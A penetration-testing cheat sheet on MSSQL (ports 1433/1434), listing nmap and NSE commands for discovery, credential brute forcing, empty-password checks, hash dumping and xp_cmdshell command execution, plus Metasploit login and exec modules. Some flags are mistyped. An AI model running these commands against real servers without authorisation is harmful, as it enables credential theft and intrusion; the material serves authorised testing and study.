---
description: 'TCP/1433, UDP/1434'
---

# MSSQL

## Enumeration with nmap

```bash
nmap -v -n -Pn -sU -p 1434 --open --oA report_mssql $range
grep open report_mssql.gnmap | cut -d" " -f2 > hosts_mssql.txt
```

## Enumeration with NSE

```bash
#all scripts
nmap -vv -sV -Pn -p 1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa $ip

#gather info
nmap -p 1433 --script ms-sql-info $ip

#brute force
nmap -p 1433 --script ms-sql-brute $ip

#custom passwords list
 –script ms-sql-brute –script-args userdb=/usr/share/passwords.txt

# check for null sessions
nmap -p 1433 --script ms-sql-empty-password $ip

nmap -p 1433 --script ms-sql-hasdbaccess.nse --script-args  mssql.username=$user $ip

nmap -p 1433 --script ms-sql-tables.nse --script-args mssql.username=$user $ip

# ms sql 2000 has xp_cmdshell

nmap -p 1433 --script ms-sql-xp-cmdshell.nse --script-args mssql.username=$user $ip

nmap -p 1433 --script ms-sql-xp-cmdshell.nse --scrip-args=ms-sql-xp-cmdshell='net users',mssql.username=$user $ip

nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=$user $ip
```

## Metasploit

```bash
> use auxiliary/scanner/mssql/mssql_ping
> use auxiliary/scanner/mssql/mssql_login
> use auxiliary/scanner/mssql/mssql_enum
> auxiliary(mssql_exec) > set CMD 'ipconfig'
> auxiliary(mssql_run) 
```

